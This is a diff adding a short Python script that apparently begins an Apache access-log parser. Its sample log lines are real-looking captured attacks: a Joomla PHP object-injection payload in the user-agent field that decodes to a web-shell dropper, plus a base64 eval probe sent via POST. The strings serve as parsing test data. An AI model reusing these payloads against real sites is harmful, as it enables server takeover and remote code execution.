@@ -1,0 +1,20 @@
+import datetime
+import re
+
+
+def reader():
+    # pattern = r'(\S+) (\S+) (\S+) \[(.*?)\] \"(\S+) (.*?) (\S+)\" (\S+) (\S+) (\".*\") (\".*?\")'
+    # # string = '91.200.14.59 - - [13/Nov/2016:14:52:22 +0100] "GET / HTTP/1.1" 200 10439 "-" "}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";s:1053:\"eval(chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(40).chr(36).chr(95).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(91).chr(39).chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84).chr(39).chr(93).chr(46).chr(39).chr(47).chr(55).chr(54).chr(54).chr(53).chr(56).chr(52).chr(50).chr(48).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101).chr(40).chr(39).chr(80).chr(68).chr(57).chr(119).chr(97).chr(72).chr(65).chr(103).chr(81).chr(71).chr(86).chr(50).chr(89).chr(87).chr(119).chr(111).chr(74).chr(70).chr(57).chr(81).chr(84).chr(49).chr(78).chr(85).chr(87).chr(121).chr(100).chr(110).chr(77).chr(122).chr(89).chr(53).chr(90).chr(121).chr(100).chr(100).chr(75).chr(84).chr(115).chr(47).chr(80).chr(103).chr(61).chr(61).chr(39).chr(41).chr(41).chr(59));JFactory::getConfig();exit\";s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";b:1;}\xf0\xfd\xfd\xfd" "-"'
+    # string = '178.115.129.29 - - [13/Nov/2016:14:35:05 +0100] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 234 "-" "MobileSafari/602.1 CFNetwork/808.1.4 Darwin/16.1.0" "-"'
+    # result = re.findall(pattern, string)
+    # res = result[0]
+    # datetime.datetime.strptime(res[3], '%d/%b/%Y:%H:%M:%S %z')
+    # print(result)
+    line = '91.200.14.59 - - [13/Nov/2016:14:52:23 +0100] "g369g=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2bfCIpOztlY2hvKCJlNTBiNWYyYjRmNjc1NGFmMDljYzg0NWI4YjU4ZTA3NiIpOztlY2hvKCJ8PC0iKTs7ZGllKCk7GET / HTTP/1.1" 200 10439 "-" "}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";s:1103:\"eval(chr(102).chr(105).chr(108).chr(101).chr(95).chr(112).chr(117).chr(116).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(40).chr(36).chr(95).chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(91).chr(39).chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84).chr(39).chr(93).chr(46).chr(39).chr(47).chr(99).chr(97).chr(99).chr(104).chr(101).chr(47).chr(55).chr(54).chr(54).chr(53).chr(56).chr(52).chr(50).chr(48).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101).chr(40).chr(39).chr(80).chr(68).chr(57).chr(119).chr(97).chr(72).chr(65).chr(103).chr(81).chr(71).chr(86).chr(50).chr(89).chr(87).chr(119).chr(111).chr(74).chr(70).chr(57).chr(81).chr(84).chr(49).chr(78).chr(85).chr(87).chr(121).chr(100).chr(110).chr(77).chr(122).chr(89).chr(53).chr(90).chr(121).chr(100).chr(100).chr(75).chr(84).chr(115).chr(47).chr(80).chr(103).chr(61).chr(61).chr(39).chr(41).chr(41).chr(59));JFactory::getConfig();exit\";s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";b:1;}\xf0\xfd\xfd\xfd" "-"'
+    # strline = line.decode('utf-8')
+    print(line)
+    # print(strline)
+
+
+if __name__ == '__main__':
+    reader()
